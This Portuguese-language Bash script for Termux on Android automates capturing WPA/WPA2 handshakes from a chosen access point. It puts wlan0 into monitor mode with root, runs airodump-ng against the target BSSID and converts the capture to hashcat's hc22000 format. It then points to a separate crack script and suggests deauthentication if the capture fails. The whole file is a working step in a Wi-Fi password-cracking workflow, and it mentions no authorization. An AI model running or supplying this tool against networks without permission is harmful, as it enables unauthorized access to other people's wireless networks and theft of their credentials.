#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# Captura de handshake WPA/WPA2
# Uso: ./capture.sh <BSSID> <CANAL>
# ============================================

BSSID="${1:-}"
CANAL="${2:-}"

if [[ -z "$BSSID" || -z "$CANAL" ]]; then
    echo "[!] Uso: ./capture.sh <BSSID> <CANAL>"
    echo "[!] Exemplo: ./capture.sh AA:BB:CC:DD:EE:FF 6"
    exit 1
fi

echo "[*] Verificando root..."
if ! command -v tsu &> /dev/null; then
    echo "[!] Root necessário para captura. Instale tsu e tenha root."
    exit 1
fi

echo "[*] Ativando modo monitor..."
tsu -c "
    ip link set wlan0 down
    iw dev wlan0 set type monitor
    ip link set wlan0 up
"

echo "[*] Iniciando captura na rede $BSSID (canal $CANAL)..."
echo "[*] Pressione Ctrl+C para parar após capturar o handshake."

# Captura por 60 segundos
tsu -c "timeout 60 airodump-ng -c $CANAL --bssid $BSSID -w /sdcard/captura wlan0"

echo ""
echo "[*] Verificando se o handshake foi capturado..."
if ls /sdcard/captura-01.cap &> /dev/null; then
    echo "[+] Handshake capturado em /sdcard/captura-01.cap"
    echo "[*] Convertendo para formato hashcat..."
    hcxpcapngtool /sdcard/captura-01.cap -o /sdcard/handshake.hc22000
    echo "[+] Convertido: /sdcard/handshake.hc22000"
    echo "[*] Agora execute: ./crack.sh /sdcard/handshake.hc22000"
else
    echo "[!] Handshake não capturado. Tente novamente ou use deautenticação."
fi
